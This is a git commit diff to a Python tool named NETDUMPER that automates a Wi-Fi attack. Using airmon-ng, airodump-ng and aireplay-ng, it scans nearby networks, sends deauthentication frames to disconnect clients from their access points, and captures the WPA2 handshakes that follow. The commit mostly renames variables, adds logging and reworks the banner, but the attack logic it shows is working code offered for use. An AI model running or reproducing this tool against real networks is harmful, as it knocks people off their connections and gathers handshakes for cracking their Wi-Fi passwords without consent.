0c2592a034031e64371ae14658bdd866c0145d77
lucasleblanc <136483947+lucaselblanc@users.noreply.github.com>
2026-06-05 18:05:37 -0300

    wpa2.py

--- wpa2.py
+++ wpa2.py
@@ -27,11 +27,7 @@ MAC_REGEX = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")
 def is_termux():
 	return "com.termux" in os.environ.get("PREFIX", "")
 
-def run_command(command, timeout=None, shell=True):
-    env = os.environ.copy()
-    if 'PREFIX' in env:
-        env['PATH'] = f"{env['PREFIX']}/bin:" + env['PATH']
-
+def run_command(command):
     if isinstance(command, str):
         if is_termux():
             command = command.strip()
@@ -41,13 +37,12 @@ def run_command(command, timeout=None, shell=True):
     try:
         result = subprocess.run(
             command,
-            shell=shell,
+            shell=True,
             check=True,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
-            timeout=timeout,
-            env=env
+            timeout=None,
         )
         return result.stdout
 
@@ -71,8 +66,12 @@ def package_installer():
     missing_packages = []
 
     for binary, package in packages.items():
-        if shutil.which(binary) is None:
+        found = shutil.which(binary)
+        if found is None:
+            logging.warning(f"{RED}Binary '{binary}' Not Found.")
             missing_packages.append(package)
+        else:
+            logging.info(f"{CYAN}Binary '{binary}' Found In: {found}")
 
     if missing_packages:
         try:
@@ -92,7 +91,7 @@ def package_installer():
         logging.info(f"{GREEN}All Packages Are Already Present In The System.")
 
 def mapping_interfaces():
-    logging.info(f"{CYAN}Locating And Categorizing Wi-Fi Plates...")
+    logging.info(f"{CYAN}Locating And Categorizing Wireless Network Interface Cards...")
 
     interfaces_info = {
         "managed": None,
@@ -114,7 +113,6 @@ def mapping_interfaces():
 
                 if iface_type == "managed" and not interfaces_info["managed"]:
                     interfaces_info["managed"] = current_interface
-
                 elif iface_type == "monitor" and not interfaces_info["monitor"]:
                     interfaces_info["monitor"] = current_interface
 
@@ -132,50 +130,50 @@ def mapping_interfaces():
         logging.error(f"{RED}Error Mapping Network Interfaces: {e}")
         return interfaces_info
 
+def format_row(content, shift_left=4, total_width=68):
+    content_clean = re.sub(r'\x1b\[[0-9;]*m', '', content)
+    left_padding = " " * shift_left
+    available_space = total_width - shift_left - len(content_clean)
+    right_padding = " " * max(0, available_space)
+    return f"{GREEN}#{RESET}{left_padding}{content}{right_padding}{GREEN}#{RESET}"
+
 def start(interfaces):
-    target_plate = interfaces["managed"]
+    managed_wnic = interfaces["managed"]
+    monitor_wnic = interfaces["monitor"]
 
-    if not target_plate:
-        logging.error(
-            f"{CYAN}No Network Plates In 'managed' Mode "
-            "Were Found To Initiate The Process."
-        )
-        return
-
-    monitor_plate = interfaces["monitor"]
     try:
-        if not monitor_plate:
-            logging.info(f"{PINK}Starting Monitor-Mode In Plate: {RESET}{CYAN}{target_plate}...")
-            run_command(f"airmon-ng start {target_plate}")
+        if not monitor_wnic:
+            logging.info(f"{PINK}Starting Monitor-Mode In Card: {RESET}{CYAN}{managed_wnic}...")
+            run_command(f"airmon-ng start {managed_wnic}")
             interfaces = mapping_interfaces()
-            monitor_plate = interfaces["monitor"]
-            if not monitor_plate:
+            monitor_wnic = interfaces["monitor"]
+            if not monitor_wnic:
                 raise Exception(
                     f"{RED}Monitor interface could not be detected "
                     "After Enabling Monitor Mode."
                 )
         else:
-            logging.info(f"{PINK}Plate: {RESET}{CYAN}{monitor_plate}{RESET}{PINK} Already In Monitor-Mode")
+            logging.info(f"{PINK}Card: {RESET}{CYAN}{monitor_wnic}{RESET}{PINK} Already In Monitor-Mode")
 
-        logging.info(f"{PINK}Enabling The Interface: {RESET}{CYAN}{monitor_plate}...")
-        run_command(f"ifconfig {monitor_plate} up")
+        logging.info(f"{PINK}Enabling The Interface: {RESET}{CYAN}{monitor_wnic}...")
+        run_command(f"ifconfig {monitor_wnic} up")
 
         logging.info(f"{PINK}Checking If The Monitor Interface Is Active...")
         ifconfig_check = run_command("ifconfig")
-        if monitor_plate not in ifconfig_check:
+        if monitor_wnic not in ifconfig_check:
             raise Exception(
-                f"The: {monitor_plate} Interface Was Not "
+                f"The: {monitor_wnic} Interface Was Not "
                 f"Found To Be Active On The System."
             )
 
         logging.info(
             f"{PINK}Starting Temporary Scan With airodump-ng "
-            f"On The Board: {RESET}{CYAN}{monitor_plate}..."
+            f"On The Board: {RESET}{CYAN}{monitor_wnic}..."
         )
         cap_prefix = "airodump_temp"
         try:
             subprocess.run(
-                f"airodump-ng --output-format csv -w {cap_prefix} {monitor_plate}",
+                f"airodump-ng --output-format csv -w {cap_prefix} {monitor_wnic}",
                 shell=True,
                 timeout=60,
                 stdout=subprocess.DEVNULL,
@@ -244,10 +242,10 @@ def start(interfaces):
             )
 
             logging.info(
-                f"{PINK}Deauthenticating ->{RESET} {CYAN}aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
+                f"{PINK}Deauthenticating ->{RESET} {CYAN}aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_wnic}"
             )
             run_command(
-                f"aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
+                f"aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_wnic}"
             )
 
             cap_file = f"package_{idx}"
@@ -257,7 +255,7 @@ def start(interfaces):
 
             cmd_capture = (
                 f"airodump-ng --bssid {mac_rot} --channel {channel} "
-                f"-w {cap_file} {monitor_plate}"
+                f"-w {cap_file} {monitor_wnic}"
             )
 
             proc_capture = subprocess.Popen(
@@ -309,55 +307,63 @@ def start(interfaces):
     finally:
         logging.info(f"{GREEN}Interrupting Monitor Mode And Restoring Wi-Fi Network...")
         try:
-            if monitor_plate:
-                run_command(f"airmon-ng stop {monitor_plate}")
+            if monitor_wnic:
+                run_command(f"airmon-ng stop {monitor_wnic}")
 
             if not is_termux():
                 run_command("systemctl restart NetworkManager")
                 run_command("nmcli radio wifi on")
+            else:
+                run_command("am start -a android.net.wifi.PICK_WIFI_NETWORK")
 
-            logging.info(f"{GREEN}Network interfaces restored and NetworkManager restarted successfully.")
+            logging.info(f"{GREEN}Network Interfaces Restored And NetworkManager Restarted Successfully.")
 
         except Exception as cleanup_error:
             logging.error(f"{RED}Error while trying to restore default network services: {cleanup_error}")
 
 if __name__ == "__main__":
 
+    print(f"{GREEN}#{RESET} {CYAN}{'='*22} WELCOME TO NETDUMPER {'='*22}{RESET} {GREEN}#{RESET}")
+    print(format_row(" ", shift_left=0))
+    print(format_row("=> Required Packages:"))
+    print(format_row(" ", shift_left=0))
+    print(format_row(f"{RED}iw{RESET}{GREEN}->{RESET} {CYAN}iw{RESET}"))
+    print(format_row(f"{RED}aircrack-ng{RESET}{GREEN}->{RESET} {CYAN}aircrack-ng{RESET}"))
+    print(format_row(f"{RED}ifconfig{RESET}{GREEN}->{RESET} {CYAN}net-tools{RESET}"))
+    print(format_row(f"{RED}iwconfig{RESET}{GREEN}->{RESET} {CYAN}wireless-tools{RESET}"))
+    print(format_row(" ", shift_left=0))
+    print(format_row(f"{CYAN}{'-'*66}{RESET}", shift_left=1))
+    print(format_row(" ", shift_left=0))
+    print(format_row("=> Requirements:"))
+    print(format_row(" ", shift_left=0))
+    print(format_row(f"{RED}[*]{RESET} Wireless Network Interface Card (WNIC)."))
+    print(format_row(f"{RED}[*]{RESET} The WNIC Chipset/Driver Must Support Monitor Mode."))
+    print(format_row(f"{RED}[*]{RESET} Root Superuser Permissions."))
+    print(format_row(" ", shift_left=0))
+    print(format_row(f"{CYAN}{'*'*66}{RESET}", shift_left=1))
+    print(format_row(" ", shift_left=0))
+    print(format_row(f"{RED}SuperUser Mode:{RESET}"))
+    print(format_row(f"{CYAN}~$ ./myuser su{RESET}"))
+    print(format_row(" ", shift_left=0))
+    print(format_row(f"{CYAN}{'*'*66}{RESET}", shift_left=1))
+    print(format_row(f"CREATED BY: {GREEN}LUCAS LEBLANC{RESET}", shift_left=22))
+    print(format_row(f"{CYAN}{'='*66}{RESET}", shift_left=1))
+
     if os.getuid() != 0:
         print(f"{RED}[ERROR] Root Authority Is Required.")
         sys.exit(1)
 
-    print(f"""
-{GREEN}#{RESET} {CYAN}======================={RESET} {GREEN}WELCOME TO NETDUMPER{RESET} {CYAN}======================={RESET} {GREEN}#{RESET}
-{GREEN}#                                                                      #{RESET}
-{GREEN}#   => Required Packages:                                              #{RESET}
-{GREEN}#                                                                      #{RESET}
-{GREEN}#{RESET}   {RED}iw{RESET}              {GREEN}->{RESET} {CYAN}iw{RESET}                                              {GREEN}#{RESET}
-{GREEN}#{RESET}   {RED}aircrack-ng{RESET}     {GREEN}->{RESET} {CYAN}aircrack-ng{RESET}                                     {GREEN}#{RESET}
-{GREEN}#{RESET}   {RED}ifconfig{RESET}        {GREEN}->{RESET} {CYAN}net-tools{RESET}                                       {GREEN}#{RESET}
-{GREEN}#{RESET}   {RED}iwconfig{RESET}        {GREEN}->{RESET} {CYAN}wireless-tools{RESET}                                  {GREEN}#{RESET}
-{GREEN}#                                                                      #{RESET}
-{GREEN}#{RESET} {CYAN}--------------------------------------------------------------------{RESET} {GREEN}#{RESET}
-{GREEN}#                                                                      #{RESET}
-{GREEN}#   => Requirements:                                                   #{RESET}
-{GREEN}#                                                                      #{RESET}
-{GREEN}#{RESET}   {RED}[1]{RESET} 2 Wi-Fi plates must be connected.                              {GREEN}#{RESET}
-{GREEN}#{RESET}   {RED}[2]{RESET} At least one must support monitoring mode.                     {GREEN}#{RESET}
-{GREEN}#{RESET}   {RED}[3]{RESET} Check the firmware compatibility.                              {GREEN}#{RESET}
-{GREEN}#                                                                      #{RESET}
-{GREEN}#{RESET} {CYAN}********************************************************************{RESET} {GREEN}#{RESET}
-{GREEN}#                                                                      #{RESET}
-{GREEN}#{RESET}   {RED}SuperUser Mode:{RESET}                                                    {GREEN}#{RESET}
-{GREEN}#{RESET}   {CYAN}~$ ./myuser su{RESET}                                                     {GREEN}#{RESET}
-{GREEN}#                                                                      #{RESET}
-{GREEN}#{RESET} {CYAN}********************************************************************{RESET} {GREEN}#{RESET}
-{GREEN}#{RESET}                      CREATED BY: {GREEN}LUCAS LEBLANC{RESET}                       {GREEN}#{RESET}
-{GREEN}#{RESET} {CYAN}===================================================================={RESET} {GREEN}#{RESET}
-""")
+    if is_termux():
+        PATH = "/data/data/com.termux/files/usr/bin"
+        if PATH not in os.environ["PATH"]:
+            os.environ["PATH"] = f"{PATH}:{os.environ['PATH']}"
+    else:
+        PATH = "/sbin:/usr/sbin:/usr/local/sbin"
+        if PATH not in os.environ["PATH"]:
+            os.environ["PATH"] = f"{os.environ['PATH']}:{PATH}"
 
-if not is_termux():
-    package_installer()
+        package_installer()
 
-mapped_interfaces = mapping_interfaces()
+    mapped_interfaces = mapping_interfaces()
 
-start(mapped_interfaces)
+    start(mapped_interfaces)
